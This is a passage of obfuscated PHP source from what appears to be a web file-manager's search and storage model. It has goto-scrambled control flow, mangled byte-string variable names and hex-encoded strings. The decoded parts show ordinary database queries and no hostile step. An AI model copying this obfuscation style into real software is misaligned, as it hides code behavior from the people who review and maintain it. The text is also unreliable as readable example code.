$this->_listSearchBindPinyin($B‚ äÕÎ÷Ï, $DØ£®Öö÷·, $c Š½°§©); $this->alias($B‹‚ÑŠ÷·„[438])->_makeOrder(); goto c˜È“ìª¨»; Aèâ¾ÙêÃ: $this->_listSearchDesc($d‡‚—ö¸Ü¨, $B‚ äÕÎ÷Ï, $bà·¬ºˆìç); $this->_listSearchTag($d‡‚—ö¸Ü¨, $B‚ äÕÎ÷Ï, $bà·¬ºˆìç); $this->_listSearchGroupTag($d‡‚—ö¸Ü¨, $B‚ äÕÎ÷Ï, $bà·¬ºˆìç); goto D¥ß´ºñ Ë; c˜È“ìª¨»: $DØ£®Öö÷· = $this->parseWhereLike($DØ£®Öö÷·); $d‡‚—ö¸Ü¨ = $this->distinct(!0)->field($c Š½°§©)->where($DØ£®Öö÷·)->selectPage($Dï°ß‘Å‹Ü); $this->_listSearchFileContent($d‡‚—ö¸Ü¨, $B‚ äÕÎ÷Ï, $bà·¬ºˆìç, $aë¸ˆ†ˆ³¥); goto Aèâ¾ÙêÃ; D¥ß´ºñ Ë: $this->_listDataApply($d‡‚—ö¸Ü¨[$B‹‚ÑŠ÷·„[367]]); $this->_listMake($d‡‚—ö¸Ü¨); return $d‡‚—ö¸Ü¨; goto c–ÙÁ¿¶˜; c–ÙÁ¿¶˜: } private function _listSearchFileContent(&$D´›¼õÃ¿è, $fÊª¢«¡Í, $cø°ÀËøå, $dÄ‹Êª¸) { goto dœ´£ÍàÓ; dŠà½…îÏ¹: $Fù”éõ¦Å = $this->field($cø°ÀËøå)->where($dÄ‹Êª¸)->limit($bƒÊìö™³Ÿ[1965])->select(); if (!$Fù”éõ¦Å || count($Fù”éõ¦Å) == 0) { return; } $D´›¼õÃ¿è[$bƒÊìö™³Ÿ[367]] = array_merge($Fù”éõ¦Å, $D´›¼õÃ¿è[$bƒÊìö™³Ÿ[367]]); goto eµêñÏìöÂ; eµêñÏìöÂ: $D´›¼õÃ¿è[$bƒÊìö™³Ÿ[364]][$bƒÊìö™³Ÿ[365]] += count($Fù”éõ¦Å); goto bùå¹ÙªÀ; dœ´£ÍàÓ: $bƒÊìö™³Ÿ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!$fÊª¢«¡Í[$bƒÊìö™³Ÿ[1807]] || $D´›¼õÃ¿è[$bƒÊìö™³Ÿ[364]][$bƒÊìö™³Ÿ[351]] > 1) { return; } if (!isset($dÄ‹Êª¸[$bƒÊìö™³Ÿ[28]]) || !is_array($fÊª¢«¡Í[$bƒÊìö™³Ÿ[461]])) { return; } goto FŸß¬º”ğ´; FŸß¬º”ğ´: $dÄ‹Êª¸[$bƒÊìö™³Ÿ[461]] = array($bƒÊìö™³Ÿ[7], $fÊª¢«¡Í[$bƒÊìö™³Ÿ[461]]); unset($dÄ‹Êª¸[$bƒÊìö™³Ÿ[28]]); unset($fÊª¢«¡Í[$bƒÊìö™³Ÿ[461]]); goto dŠà½…îÏ¹; bùå¹ÙªÀ: } private function _listSearchTag(&$bùìâÁÕ±ä, $fƒšõ¬Êåš, $c¶µ´“Ø½É) { goto FóÏ®ÌôÀµ; FóÏ®ÌôÀµ: $dóÄ†¹š» =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!$fƒšõ¬Êåš[$dóÄ†¹š»[1807]] || $bùìâÁÕ±ä[$dóÄ†¹š»[364]][$dóÄ†¹š»[351]] > 1) { return; } $b±™±¾¾Ë = Model($dóÄ†¹š»[1966])->listData(); goto EµÁ´ëÃ–; DÙëøæ¿ ¥: if (!$A÷Š‰§’âë) { return; } $Eì‹“áÆâ„ = array($dóÄ†¹š»[421] => array($dóÄ†¹š»[7], $A÷Š‰§’âë), $dóÄ†¹š»[1550] => USER_ID); $dçÏÖÑœÛÔ = Model($dóÄ†¹š»[422])->field($dóÄ†¹š»[76])->where($Eì‹“áÆâ„)->select(); goto eï†ÈôßÔğ; eï†ÈôßÔğ: $dçÏÖÑœÛÔ = array_to_keyvalue($dçÏÖÑœÛÔ, $dóÄ†¹š»[33], $dóÄ†¹š»[76]); $A”¬”…¦¨ = array_unique($dçÏÖÑœÛÔ); $this->_listSearchMerge($bùìâÁÕ±ä, $fƒšõ¬Êåš, $c¶µ´“Ø½É, $A”¬”…¦¨); goto b—óàÃƒÓÜ; EµÁ´ëÃ–: $A÷Š‰§’âë = array(); $bº£ŞÂ¾ìŸ = $fƒšõ¬Êåš[$dóÄ†¹š»[1807]]; foreach ($b±™±¾¾Ë as $cˆ­°¨ª‡) { $BôÊ×–õªï = $cˆ­°¨ª‡[$dóÄ†¹š»[28]]; $F•ÏãîÓ— = str_replace($dóÄ†¹š»[50], $dóÄ†¹š»[33], Pinyin::get($BôÊ×–õªï)); if (stripos($BôÊ×–õªï, $bº£ŞÂ¾ìŸ) !== !1 || stripos($F•ÏãîÓ—, $bº£ŞÂ¾ìŸ) !== !1) { $A÷Š‰§’âë[] = $cˆ­°¨ª‡[$dóÄ†¹š»[395]]; } } goto DÙëøæ¿ ¥; b—óàÃƒÓÜ: } private function _listSearchDesc(&$B¬ëé¦Œ©ƒ, $D¤‚Ò¯¦‘³, $d‹¬²Á¹Ú†) { goto aÎšª‰Áˆ; dµÜº×“Á›: $DšäÌŒ‚ğ = array_unique($DšäÌŒ‚ğ); if (!$DšäÌŒ‚ğ) { return; } $EìÌó«¬‡” = array($dÄ£¿Ş‹×²[397] => array($dÄ£¿Ş‹×²[7], $DšäÌŒ‚ğ), $dÄ£¿Ş‹×²[93] => $dÄ£¿Ş‹×²[445], $dÄ£¿Ş‹×²[372] => array($dÄ£¿Ş‹×²[381], $dÄ£¿Ş‹×²[1809] . $D¤‚Ò¯¦‘³[$dÄ£¿Ş‹×²[1807]] . $dÄ£¿Ş‹×²[1809])); goto F åß ÃÙŸ; F åß ÃÙŸ: $eÃ™š¬„Ô“ = Model($dÄ£¿Ş‹×²[557])->field($dÄ£¿Ş‹×²[397])->where($EìÌó«¬‡”)->select(); $fÏøèÔâÂ– = array_to_keyvalue($eÃ™š¬„Ô“, $dÄ£¿Ş‹×²[33], $dÄ£¿Ş‹×²[397]); $this->_listSearchMerge($B¬ëé¦Œ©ƒ, $D¤‚Ò¯¦‘³, $d‹¬²Á¹Ú†, $fÏøèÔâÂ–); goto Cï´¹ÆÖéõ; aÎšª‰Áˆ: $dÄ£¿Ş‹×² =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!$D¤‚Ò¯¦‘³[$dÄ£¿Ş‹×²[1807]] || $B¬ëé¦Œ©ƒ[$dÄ£¿Ş‹×²[364]][$dÄ£¿Ş‹×²[351]] > 1) { return; } $DšäÌŒ‚ğ = $this->listSearchChildren($D¤‚Ò¯¦‘³[$dÄ£¿Ş‹×²[492]]); goto dµÜº×“Á›; Cï´¹ÆÖéõ: } private function _listSearchGroupTag(&$aøĞˆë¯, $EÊ‘ªƒÆçÑ, $Eó¡”Ì¯÷ë) { goto fí’ÛßÄ»…; e¨ŞÑÊÏÒª: $eì‡Ú„ÌÃ– = array_to_keyvalue($eì‡Ú„ÌÃ–, $E‚ñ–•Ä‚“[33], $E‚ñ–•Ä‚“[76]); $cĞäË´èÒ = array_unique($eì‡Ú„ÌÃ–); $this->_listSearchMerge($aøĞˆë¯, $EÊ‘ªƒÆçÑ, $Eó¡”Ì¯÷ë, $cĞäË´èÒ); goto c–õŒŒÜÂ˜; A²ğ’¾«ë²: if (!$Fˆë‰æ£ÌÚ || $Fˆë‰æ£ÌÚ[$E‚ñ–•Ä‚“[406]] != SourceModel::TYPE_GROUP) { return; } $cµŠî¯Ç ì = $Fˆë‰æ£ÌÚ[$E‚ñ–•Ä‚“[498]]; $Ağ‚¸³‹µ = Model($E‚ñ–•Ä‚“[1967])->get($cµŠî¯Ç ì); goto Aõ»«Õ½; Aõ»«Õ½: $f¸³İ—´ãš = array(); $CÉƒ½õ¦ÔŒ = $EÊ‘ªƒÆçÑ[$E‚ñ–•Ä‚“[1807]]; foreach ($Ağ‚¸³‹µ[$E‚ñ–•Ä‚“[367]] as $A‘¹ó›ÖÇâ) { $dæÍ·°Ñ‘Ä = $A‘¹ó›ÖÇâ[$E‚ñ–•Ä‚“[28]]; $EÄâÁ¯šÉ = str_replace($E‚ñ–•Ä‚“[50], $E‚ñ–•Ä‚“[33], Pinyin::get($dæÍ·°Ñ‘Ä)); if (stripos($dæÍ·°Ñ‘Ä, $CÉƒ½õ¦ÔŒ) !== !1 || stripos($EÄâÁ¯šÉ, $CÉƒ½õ¦ÔŒ) !== !1) { $f¸³İ—´ãš[] = $A‘¹ó›ÖÇâ[$E‚ñ–•Ä‚“[395]]; } } goto E¿í½è²†Í; fí’ÛßÄ»…: $E‚ñ–•Ä‚“ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!$EÊ‘ªƒÆçÑ[$E‚ñ–•Ä‚“[1807]] || $aøĞˆë¯[$E‚ñ–•Ä‚“[364]][$E‚ñ–•Ä‚“[351]] > 1 || !$EÊ‘ªƒÆçÑ[$E‚ñ–•Ä‚“[492]]) { return; } $Fˆë‰æ£ÌÚ = $this->sourceInfo($EÊ‘ªƒÆçÑ[$E‚ñ–•Ä‚“[492]]); goto A²ğ’¾«ë²; E¿í½è²†Í: if (!$f¸³İ—´ãš) { return; } $e³‰¯Å‹Ì¸ = array($E‚ñ–•Ä‚“[421] => array($E‚ñ–•Ä‚“[7], $f¸³İ—´ãš), $E‚ñ–•Ä‚“[1550] => 0, $E‚ñ–•Ä‚“[29] => $E‚ñ–•Ä‚“[1831] . $cµŠî¯Ç ì); $eì‡Ú„ÌÃ– = Model($E‚ñ–•Ä‚“[422])->field($E‚ñ–•Ä‚“[76])->where($e³‰¯Å‹Ì¸)->select(); goto e¨ŞÑÊÏÒª; c–õŒŒÜÂ˜: } private function _listSearchMerge(&$dˆßĞ¾Ùß, $aÇ†Ô„¸Ü–, $b­Ó’„ƒ§, $aÓ˜³‘Ó¡ê) { goto e“¿„¾Õ°; e“¿„¾Õ°: $a¥º»Ì§Ÿ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!$aÓ˜³‘Ó¡ê) { return; } $aë˜ëÙõ› = array_to_keyvalue($dˆßĞ¾Ùß[$a¥º»Ì§Ÿ[367]], $a¥º»Ì§Ÿ[33], $a¥º»Ì§Ÿ[397]); goto FÄÈÂ¯ê ’; FÄÈÂ¯ê ’: $aŠßøÄßÏ = array_diff($aÓ˜³‘Ó¡ê, $aë˜ëÙõ›); if (!$aŠßøÄßÏ) { return; } $B’š¼ÍŒ¦ = array($a¥º»Ì§Ÿ[397] => array($a¥º»Ì§Ÿ[7], $aŠßøÄßÏ)); goto eŸÈ¯Â²äº; eŸÈ¯Â²äº: $bÎò“ Ş•¢ = $this->field($b­Ó’„ƒ§)->where($B’š¼ÍŒ¦)->select(); if (!$bÎò“ Ş•¢) { return; } $C…éÆö–™Õ = array(); goto D¨Æì¼Œ‹; D¨Æì¼Œ‹: foreach ($bÎò“ Ş•¢ as $fÆÓÖ¶‚å) { if ($this->_listSearchFilter($fÆÓÖ¶‚å, $aÇ†Ô„¸Ü–)) { $C…éÆö–™Õ[] = $fÆÓÖ¶‚å; } } $dˆßĞ¾Ùß[$a¥º»Ì§Ÿ[367]] = array_merge($C…éÆö–™Õ, $dˆßĞ¾Ùß[$a¥º»Ì§Ÿ[367]]); $dˆßĞ¾Ùß[$a¥º»Ì§Ÿ[364]][$a¥º»Ì§Ÿ[365]] += count($C…éÆö–™Õ); goto B˜Ì¿Ú†»; B˜Ì¿Ú†»: } private function _listSearchFilter($E¤æó¯«õ, $fº”äô«ï°) { goto fˆìô¿ïë«; Cè­õš‘: if (isset($fº”äô«ï°[$E…Õ“§œˆ²[407]]) && $fº”äô«ï°[$E…Õ“§œˆ²[407]] != $E…Õ“§œˆ²[1773]) { if ($fº”äô«ï°[$E…Õ“§œˆ²[407]] == $E…Õ“§œˆ²[77] && !$Bõ„‹Æ£¢») { return !1; } if ($fº”äô«ï°[$E…Õ“§œˆ²[407]] != $E…Õ“§œˆ²[77] && $Bõ„‹Æ£¢») { return !1; } if (!strstr($E¤æó¯«õ[$E…Õ“§œˆ²[168]], $E…Õ“§œˆ²[47] . $fº”äô«ï°[$E…Õ“§œˆ²[407]] . $E…Õ“§œˆ²[47])) { return !1; } } if (isset($fº”äô«ï°[$E…Õ“§œˆ²[1968]]) && $fº”äô«ï°[$E…Õ“§œˆ²[1968]] < $E¤æó¯«õ[$E…Õ“§œˆ²[78]]) { return !1; } if (isset($fº”äô«ï°[$E…Õ“§œˆ²[1969]]) && $fº”äô«ï°[$E…Õ“§œˆ²[1969]] > $E¤æó¯«õ[$E…Õ“§œˆ²[78]]) { return !1; } goto FğÉšÑ¬; fˆìô¿ïë«: $E…Õ“§œˆ² =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $Bõ„‹Æ£¢» = $E¤æó¯«õ[$E…Õ“§œˆ²[405]] == $E…Õ“§œˆ²[87]; if (!strstr($E¤æó¯«õ[$E…Õ“§œˆ²[515]], $E…Õ“§œˆ²[47] . $fº”äô«ï°[$E…Õ“§œˆ²[492]] . $E…Õ“§œˆ²[47])) { return !1; } goto Cè­õš‘; FğÉšÑ¬: if (isset($fº”äô«ï°[$E…Õ“§œˆ²[588]]) && $fº”äô«ï°[$E…Õ“§œˆ²[588]] != $E¤æó¯«õ[$E…Õ“§œˆ²[448]]) { return !1; } return !0; goto F„Úµª‚; F„Úµª‚: } public function listSearchChildren($eÂÅçäÎòŠ, $c‘ÔºÚ–‘ = 5000) { goto cğ²Õƒ­°×; b‰‚ÁùÊ›: $d…Ù¼ïâÍÏ = array($E´æ˜ÉóË¦[515] => array($E´æ˜ÉóË¦[381], $bõ›–¥¢[$E´æ˜ÉóË¦[515]] . $bõ›–¥¢[$E´æ˜ÉóË¦[397]] . $E´æ˜ÉóË¦[539])); $DÅ ”„×˜ = $this->field($E´æ˜ÉóË¦[397])->cache(null, 600)->where($d…Ù¼ïâÍÏ)->count(); if ($DÅ ”„×˜ > $c‘ÔºÚ–‘) { return $this->_listSearchChildrenNear($eÂÅçäÎòŠ, $c‘ÔºÚ–‘); } goto dÓÄùÔö‰; cğ²Õƒ­°×: $E´æ˜ÉóË¦ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $D…ÇæêĞ»Ã = array(); $bõ›–¥¢ = $this->sourceInfo($eÂÅçäÎòŠ); goto b‰‚ÁùÊ›; dÓÄùÔö‰: $Dóáí˜ÖåÏ = $this->field($E´æ˜ÉóË¦[397])->where($d…Ù¼ïâÍÏ)->select(); $D…ÇæêĞ»Ã = array_to_keyvalue($Dóáí˜ÖåÏ, $E´æ˜ÉóË¦[33], $E´æ˜ÉóË¦[397]); return $D…ÇæêĞ»Ã; goto d§ßÍ‚ç°¤; d§ßÍ‚ç°¤: } private function _listSearchChildrenNear($DÏ•¥æ©ö, $Eµø•ÆŞ˜‘) { goto f¡¦Ì›“Í; A‘ğØæİÈ†: if (!$FÒØ½ÌĞç­) { return $cĞœ­òÂ‡Š; } $dßåğ—õÉò = array($aéÔá®³²Ç[492] => array($aéÔá®³²Ç[7], $FÒØ½ÌĞç­)); $b¸ÂİÄà‚ = $this->field($aéÔá®³²Ç[1970])->where($dßåğ—õÉò)->limit($Eµø•ÆŞ˜‘)->select(); goto A®ä§Í‰Íå; A®ä§Í‰Íå: $cĞœ­òÂ‡Š = array_merge($cĞœ­òÂ‡Š, array_to_keyvalue($b¸ÂİÄà‚, $aéÔá®³²Ç[33], $aéÔá®³²Ç[397])); $cĞœ­òÂ‡Š = array_slice($cĞœ­òÂ‡Š, 0, $Eµø•ÆŞ˜‘); return $cĞœ­òÂ‡Š; goto aƒ×åËÀõ; D™ë¾‚½îÓ: $b¸ÂİÄà‚ = $this->field($aéÔá®³²Ç[1970])->where($dßåğ—õÉò)->select(); $FÒØ½ÌĞç­ = array_to_keyvalue(array_filter_by_field($b¸ÂİÄà‚, $aéÔá®³²Ç[405], $aéÔá®³²Ç[87]), $aéÔá®³²Ç[33], $aéÔá®³²Ç[397]); $cĞœ­òÂ‡Š = array_merge($cĞœ­òÂ‡Š, array_to_keyvalue($b¸ÂİÄà‚, $aéÔá®³²Ç[33], $aéÔá®³²Ç[397])); goto A‘ğØæİÈ†; f¡¦Ì›“Í: $aéÔá®³²Ç =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $cĞœ­òÂ‡Š = array(); $dßåğ—õÉò = array($aéÔá®³²Ç[492] => $DÏ•¥æ©ö); goto D™ë¾‚½îÓ; aƒ×åËÀõ: } private function _listSearchBindPinyin($eÂ„ªà”’¥, &$Eº¤¤„ÕÍ, &$c¢‰Ôà¯Ê) { goto D¸ÑäÛ¿©; bô»Âœæİ: foreach ($Eº¤¤„ÕÍ as $E¹”Ç¸›œ˜ => $aØ¼™¶¹í˜) { $a…ŞÚó°ù›[$dĞòíˆó×Ú[430] . $E¹”Ç¸›œ˜] = $aØ¼™¶¹í˜; } foreach ($f™ˆœ£ç§ as $Cãôø†íŸã) { $a…ŞÚó°ù›[] = array($dĞòíˆó×Ú[435] => $Cãôø†íŸã, $dĞòíˆó×Ú[980] => $dĞòíˆó×Ú[1811], array($dĞòíˆó×Ú[1972] => $Cãôø†íŸã, $dĞòíˆó×Ú[1973] => array($dĞòíˆó×Ú[7], array($dĞòíˆó×Ú[458], $dĞòíˆó×Ú[457])))); } $this->join($c‘Ì‰í‡¦‘); goto b‡ƒ¡³šè; D¸ÑäÛ¿©: $dĞòíˆó×Ú =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!isset($eÂ„ªà”’¥[$dĞòíˆó×Ú[1807]]) || !$eÂ„ªà”’¥[$dĞòíˆó×Ú[1807]]) { return; } if (!Input::check($eÂ„ªà”’¥[$dĞòíˆó×Ú[1807]], $dĞòíˆó×Ú[316]) || strlen($eÂ„ªà”’¥[$dĞòíˆó×Ú[1807]]) < 2) { return; } goto d‡²öÇƒŠ—; b®‚Ç—ğ«Û: $c¢‰Ôà¯Ê = $dĞòíˆó×Ú[430] . str_replace($dĞòíˆó×Ú[47], $dĞòíˆó×Ú[431], $c¢‰Ôà¯Ê); $f™ˆœ£ç§ = $Eº¤¤„ÕÍ[$dĞòíˆó×Ú[28]]; unset($Eº¤¤„ÕÍ[$dĞòíˆó×Ú[28]]); goto bô»Âœæİ; b‡ƒ¡³šè: $Eº¤¤„ÕÍ = $a…ŞÚó°ù›; goto BÎó³ëèÂÅ; d‡²öÇƒŠ—: $c‘Ì‰í‡¦‘ = "\x4c\x45\x46\x54\40\x4a\117\x49\116\40{$this->tablePrefix}\x69\157\x5f\163\157\165\x72\x63\x65\x5f\155\145\x74\x61\40\x6d\145\164\141\x20\157\x6e\40\x73\157\x75\x72\x63\145\56\x73\x6f\165\162\143\x65\111\x44\40\75\x20\155\145\164\141\x2e\x73\157\165\162\143\145\x49\104"; $a…ŞÚó°ù› = array(); $c¢‰Ôà¯Ê = str_replace(array($dĞòíˆó×Ú[229], $dĞòíˆó×Ú[50], $dĞòíˆó×Ú[1971]), $dĞòíˆó×Ú[33], $c¢‰Ôà¯Ê); goto b®‚Ç—ğ«Û; BÎó³ëèÂÅ: } private function _parseSearchWhere($DŠóŒôÖÓ–) { goto eñŸªµ‚–ñ; B™×ÜÎñÛœ: if (isset($DŠóŒôÖÓ–[$eš‡ãËƒ‹Ï[1807]]) && trim($DŠóŒôÖÓ–[$eš‡ãËƒ‹Ï[1807]])) { $eˆ£Ñã×Õœ = trim($DŠóŒôÖÓ–[$eš‡ãËƒ‹Ï[1807]]); $c…ÇùíÖƒ  = explode($eš‡ãËƒ‹Ï[50], $eˆ£Ñã×Õœ); if (strlen($eˆ£Ñã×Õœ) > 2 && (substr($eˆ£Ñã×Õœ, 0, 1) == $eš‡ãËƒ‹Ï[116] && substr($eˆ£Ñã×Õœ, -1) == $eš‡ãËƒ‹Ï[116]) || substr($eˆ£Ñã×Õœ, 0, 1) == $eš‡ãËƒ‹Ï[55] && substr($eˆ£Ñã×Õœ, -1) == $eš‡ãËƒ‹Ï[55]) { $eˆ£Ñã×Õœ = substr($eˆ£Ñã×Õœ, 1, -1); $c…ÇùíÖƒ  = array($eˆ£Ñã×Õœ); } $eó…Æ™ÁË¥[$eš‡ãËƒ‹Ï[28]] = array(array($eš‡ãËƒ‹Ï[538], $eš‡ãËƒ‹Ï[1809] . $eˆ£Ñã×Õœ . $eš‡ãËƒ‹Ï[1809])); if (count($c…ÇùíÖƒ ) > 1) { $eó…Æ™ÁË¥[$eš‡ãËƒ‹Ï[28]] = array(); foreach ($c…ÇùíÖƒ  as $f‚Ê¡Óä†‘) { if (!trim($f‚Ê¡Óä†‘)) { continue; } $eó…Æ™ÁË¥[$eš‡ãËƒ‹Ï[28]][] = array($eš‡ãËƒ‹Ï[538], $eš‡ãËƒ‹Ï[1809] . trim($f‚Ê¡Óä†‘) . $eš‡ãËƒ‹Ï[1809]); } } } return $eó…Æ™ÁË¥; goto fÅË³ï˜–Í; bµõØš–: if (isset($DŠóŒôÖÓ–[$eš‡ãËƒ‹Ï[588]]) && $DŠóŒôÖÓ–[$eš‡ãËƒ‹Ï[588]]) { $eó…Æ™ÁË¥[] = array($eš‡ãËƒ‹Ï[448] => $DŠóŒôÖÓ–[$eš‡ãËƒ‹Ï[588]], $eš‡ãËƒ‹Ï[446] => $DŠóŒôÖÓ–[$eš‡ãËƒ‹Ï[588]], $eš‡ãËƒ‹Ï[980] => $eš‡ãËƒ‹Ï[1811]); } if (isset($DŠóŒôÖÓ–[$eš‡ãËƒ‹Ï[407]]) && $DŠóŒôÖÓ–[$eš‡ãËƒ‹Ï[407]]) { $BŒù£óÜÑ = $DŠóŒôÖÓ–[$eš‡ãËƒ‹Ï[407]]; if ($BŒù£óÜÑ == $eš‡ãËƒ‹Ï[77]) { $eó…Æ™ÁË¥[$eš‡ãËƒ‹Ï[405]] = 1; } else { if ($BŒù£óÜÑ == $eš‡ãËƒ‹Ï[1977]) { $eó…Æ™ÁË¥[$eš‡ãËƒ‹Ï[405]] = 0; } else { if ($BŒù£óÜÑ) { $BŒù£óÜÑ = is_array($BŒù£óÜÑ) ? $BŒù£óÜÑ : explode($eš‡ãËƒ‹Ï[47], $BŒù£óÜÑ); $eó…Æ™ÁË¥[$eš‡ãËƒ‹Ï[407]] = array($eš‡ãËƒ‹Ï[413], $BŒù£óÜÑ); $eó…Æ™ÁË¥[$eš‡ãËƒ‹Ï[405]] = 0; } } } } $this->_parseSearchParent($DŠóŒôÖÓ–, $eó…Æ™ÁË¥); goto B™×ÜÎñÛœ; dÛöªÇ¿¹Ò: if (isset($DŠóŒôÖÓ–[$eš‡ãËƒ‹Ï[490]]) && $DŠóŒôÖÓ–[$eš‡ãËƒ‹Ï[490]]) { $B¶“¦ˆâ‹ = array($eš‡ãËƒ‹Ï[1975], $DŠóŒôÖÓ–[$eš‡ãËƒ‹Ï[490]]); if ($eó…Æ™ÁË¥[$eš‡ãËƒ‹Ï[84]]) { $eó…Æ™ÁË¥[$eš‡ãËƒ‹Ï[84]] = array($eó…Æ™ÁË¥[$eš‡ãËƒ‹Ï[84]], $B¶“¦ˆâ‹, $eš‡ãËƒ‹Ï[1976]); } else { $eó…Æ™ÁË¥[$eš‡ãËƒ‹Ï[84]] = $B¶“¦ˆâ‹; } } if (isset($DŠóŒôÖÓ–[$eš‡ãËƒ‹Ï[1968]]) && $DŠóŒôÖÓ–[$eš‡ãËƒ‹Ï[1968]] > 0) { $eó…Æ™ÁË¥[$eš‡ãËƒ‹Ï[78]] = array($eš‡ãËƒ‹Ï[1974], $DŠóŒôÖÓ–[$eš‡ãËƒ‹Ï[1968]]); } if (isset($DŠóŒôÖÓ–[$eš‡ãËƒ‹Ï[1969]]) && $DŠóŒôÖÓ–[$eš‡ãËƒ‹Ï[1969]]) { $B¶“¦ˆâ‹ = array($eš‡ãËƒ‹Ï[1975], $DŠóŒôÖÓ–[$eš‡ãËƒ‹Ï[1969]]); if ($eó…Æ™ÁË¥[$eš‡ãËƒ‹Ï[78]]) { $eó…Æ™ÁË¥[$eš‡ãËƒ‹Ï[78]] = array($eó…Æ™ÁË¥[$eš‡ãËƒ‹Ï[78]], $B¶“¦ˆâ‹, $eš‡ãËƒ‹Ï[1976]); } else { $eó…Æ™ÁË¥[$eš‡ãËƒ‹Ï[78]] = $B¶“¦ˆâ‹; } } goto bµõØš–; eñŸªµ‚–ñ: $eš‡ãËƒ‹Ï =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $eó…Æ™ÁË¥ = array(); if (isset($DŠóŒôÖÓ–[$eš‡ãËƒ‹Ï[742]]) && $DŠóŒôÖÓ–[$eš‡ãËƒ‹Ï[742]]) { $eó…Æ™ÁË¥[$eš‡ãËƒ‹Ï[84]] = array($eš‡ãËƒ‹Ï[1974], $DŠóŒôÖÓ–[$eš‡ãËƒ‹Ï[742]]); } goto dÛöªÇ¿¹Ò; fÅË³ï˜–Í: } private function _parseSearchParent($Eô…ã°É¯, &$däàÓÏ¿£«) { goto DæÁÜŠØå·; Cºƒ¤·‚…‘: $eñ´Öèß™Œ = $eÁÔ¦õÅÔ[$Fã©£½­ÂŠ[498]] . $Fã©£½­ÂŠ[33]; if ($eñ´Öèß™Œ == $Fã©£½­ÂŠ[87]) { unset($däàÓÏ¿£«[$Fã©£½­ÂŠ[578]]); $däàÓÏ¿£«[$Fã©£½­ÂŠ[406]] = self::TYPE_GROUP; return; } $D–Ù²Óø·â = Model($Fã©£½­ÂŠ[516])->groupChildrenAll($eñ´Öèß™Œ); goto EÈÁñÆÀ¿ç; C§ˆçÜ¤´ƒ: $fÜ’–×…ˆ¹ = $eÁÔ¦õÅÔ[$Fã©£½­ÂŠ[492]] . $Fã©£½­ÂŠ[33] === $Fã©£½­ÂŠ[191]; $c‡¿ì÷Î¶ô = $eÁÔ¦õÅÔ[$Fã©£½­ÂŠ[406]] == $Fã©£½­ÂŠ[509]; $däàÓÏ¿£«[$Fã©£½­ÂŠ[578]] = array($Fã©£½­ÂŠ[538], $eÁÔ¦õÅÔ[$Fã©£½­ÂŠ[515]] . $Eô…ã°É¯[$Fã©£½­ÂŠ[492]] . $Fã©£½­ÂŠ[539]); goto D÷¨­¬Î¢; DæÁÜŠØå·: $Fã©£½­ÂŠ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!isset($Eô…ã°É¯[$Fã©£½­ÂŠ[492]]) || !$Eô…ã°É¯[$Fã©£½­ÂŠ[492]]) { return; } $eÁÔ¦õÅÔ = $this->pathInfo($Eô…ã°É¯[$Fã©£½­ÂŠ[492]]); goto C§ˆçÜ¤´ƒ; D÷¨­¬Î¢: $eÀ˜«Â„ƒŠ = isset($Eô…ã°É¯[$Fã©£½­ÂŠ[1675]]) && in_array($Fã©£½­ÂŠ[509], $Eô…ã°É¯[$Fã©£½­ÂŠ[1675]]); if (!$eÀ˜«Â„ƒŠ || !$c‡¿ì÷Î¶ô || !$fÜ’–×…ˆ¹ || !$eÁÔ¦õÅÔ[$Fã©£½­ÂŠ[408]]) { return; } if (!AuthModel::authCheckRoot($eÁÔ¦õÅÔ[$Fã©£½­ÂŠ[408]][$Fã©£½­ÂŠ[409]])) { return; } goto Cºƒ¤·‚…‘; EÈÁñÆÀ¿ç: $eè‹³å¬ƒ = count($D–Ù²Óø·â); if ($eè‹³å¬ƒ <= 1) { return; } $F”Ú…ÛÜ = array($Fã©£½­ÂŠ[492] => 0, $Fã©£½­ÂŠ[406] => self::TYPE_GROUP, $Fã©£½­ÂŠ[498] => array($Fã©£½­ÂŠ[7], $D–Ù²Óø·â)); goto DÅÑ«ÀÜ¿; c¤Èé¼ˆ„§: $däàÓÏ¿£«[$Fã©£½­ÂŠ[578]][] = $Fã©£½­ÂŠ[1811]; goto BÄˆ©õÇïõ; DÅÑ«ÀÜ¿: $föÌ†Öà¿ğ = $this->field($Fã©£½­ÂŠ[1978])->where($F”Ú…ÛÜ)->limit($eè‹³å¬ƒ)->select(); $däàÓÏ¿£«[$Fã©£½­ÂŠ[578]] = array(); foreach ($föÌ†Öà¿ğ as $fè„–ƒÙÜÎ) { $däàÓÏ¿£«[$Fã©£½­ÂŠ[578]][] = array($Fã©£½­ÂŠ[538], $Fã©£½­ÂŠ[525] . $fè„–ƒÙÜÎ[$Fã©£½­ÂŠ[397]] . $Fã©£½­ÂŠ[539]); } goto c¤Èé¼ˆ„§; BÄˆ©õÇïõ: } } goto AõºÚŸîé´; cš£Ä‰ù©Ş: class StorageModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\x65\155\x2e\163\164\157\x72\x61\147\145\114\x69\x73\164"; public $field = array("\156\x61\x6d\x65", "\x73\151\172\x65\x4d\x61\x78", "\x73\x79\x73\164\145\155", "\x64\x65\x66\x61\x75\154\x74", "\144\162\151\166\x65\x72", "\x63\x6f\156\146\x69\x67"); public function listData($B–™öÏŞğó = false, $céî•‹ğ = "\x6d\157\x64\151\146\171\124\151\x6d\145", $f±ë‘ˆ…Æ† = false) { $DÅ¶’¦¯Ÿ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $dùƒô¼êÙê = parent::listData($B–™öÏŞğó, $céî•‹ğ, $f±ë‘ˆ…Æ†); if ($B–™öÏŞğó) { return $dùƒô¼êÙê; } $d‹Ç¨¹¸×™ = $this->ioSizeUseGet(array_to_keyvalue($dùƒô¼êÙê, $DÅ¶’¦¯Ÿ[33], $DÅ¶’¦¯Ÿ[395])); foreach ($dùƒô¼êÙê as $eÙšò İ×Œ => $aƒ ÔÔ‰‘Í) { unset($dùƒô¼êÙê[$eÙšò İ×Œ][$DÅ¶’¦¯Ÿ[6]]); $dùƒô¼êÙê[$eÙšò 